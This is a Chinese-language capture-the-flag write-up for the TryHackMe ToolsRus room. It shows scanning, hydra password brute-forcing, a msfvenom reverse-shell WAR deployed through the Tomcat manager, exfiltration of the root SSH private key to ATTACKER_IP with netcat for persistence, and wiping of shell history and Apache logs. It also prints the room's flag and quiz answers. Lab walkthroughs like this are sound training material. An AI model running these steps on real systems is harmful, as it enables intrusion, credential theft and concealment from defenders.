---
title: "ToolsRus Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "在 TryHackMe 的 ToolsRus 靶房中，向存在漏洞的 Tomcat manager 上传恶意 WAR 文件以获取反向 shell，随后利用 SSH 密钥实现权限维持。"
---

## 环境准备 

首先我们需要连接到 tryhackme 的 VPN 服务器。你可以访问 [Access](https://tryhackme.com/access) 页面获取更多相关信息。

我将使用 `openvpn` 连接到服务器。命令如下：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## 信息收集
来做点快速端口扫描和侦察（感谢 `rustscan` 的作者们）：
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

进行目录枚举：
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > 你能找到哪个以 "g" 开头的目录？
 > 
 > Answer: `guidelines`
 
访问 `/guidelines/` 目录，我们只看到一段文本：`Hey bob, did you update that TomCat server?`。

> 你能从这个目录中找到谁的名字？
> 
> Answer: `bob`


此外，请求 `protected` 目录会弹出一个认证窗口……
> 哪个目录启用了基本认证（basic authentication）？
> 
> Answer: `protected`

咱们尝试用 hydra 来爆破一下 :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> bob 访问该网站受保护部分的密码是什么？
> 
> Answer: `bubbles`

登录 `protected` 页面后，映入眼帘的是以下页面：
![](/assets/img/writeup_assets/toolsrus/protected_page_moved.png)

正如我们之前从端口扫描中发现的，端口 **1234** 上运行着一个 _Apache Tomcat server_。我们尝试通过请求 `http://TARGET_IP:1234/manager/` 来登录后台。这里出现了一个熟悉的认证界面。如果我们使用凭据 `bob:bubbles`，就能成功进入服务器控制面板！

> 机器上还开放了哪个提供 Web 服务的端口？
> 
> Answer: `1234`



tomcat 服务器的版本号可以在 `manager` 页面底部找到……
> 访问该端口上运行的服务，该软件的名称和版本是什么？
> (Answer format: Full_name_of_service/Version)
> 
> Answer: `Apache Tomcat/7.0.88`

Tomcat manager 页面上一共提到了 5 个文档文件，所以暂时不需要用 `nikto`（老实说，nikto 用起来也有点让人摸不着头脑）：
> ~~Nikto~~ 你一共识别出了多少个文档文件？
> 
> Answer: `5`


> 服务器版本是什么（针对 80 端口运行扫描）？
> 
> Answer: `Apache/2.4.18`


> 该服务使用的是哪个版本的 Apache-Coyote？
> 
> Answer: `1.1`


掌握了所有这些关于版本号之类的信息后，来看看我们可以利用哪些漏洞利用手段来获取目标机器的访问权限：

## 获取权限
现在……如果按照靶房的指导来做，这部分通常分为 _2_ 个阶段，但既然我们可以在 `manager` 页面部署文件，就能轻松拿到一个反向 shell（接下来你就会发现，这直接就是个 root shell！）。我们先从生成合适的 payload 开始：
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

我们生成一个 `WAR` 文件作为 payload，因为我们可以直接从 `manager` 页面上传它：
![](/assets/img/writeup_assets/toolsrus/war_file_upload.png)

文件部署完成后，在你的本地机器上指定端口（本例中为 4444）启动监听，如下所示：
```shell-session
$ nc -nvlp 4444
```

现在，当我们请求 URL：`http://TARGET_IP:1234/reverse/` 时，netcat 监听端就会收到连接，接下来我们就可以去稳定 shell 了：
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!额外步骤!!***

现在，即便我们已经拿到了 root 权限的反向 shell，如果我们后续还打算利用这台机器，反复上传反向 shell 并重新稳定它还是很麻烦。所以我们顺便获取 ssh 私钥来实现权限维持，并清理掉我们上传的 `/reverse.war` 文件：
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

搞定！现在我们有了基于 `ssh` 的持久化访问权限，在收工前再清理一下现场……
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

大功告成！

> 文件 `/root/flag.txt` 中的文本内容是什么？
> 
> Answer: `ff1fc4a81affcc7688cf89ae7dc6e0e1`

## 结语
如果这篇 writeup 对你有帮助，请考虑在 GitHub 上关注我 (https://github.com/NovusEdge) 和/或给仓库点个 star：https://github.com/NovusEdge/thm-writeups


- 靶房: [ToolsRus](https://tryhackme.com/room/toolsrus)
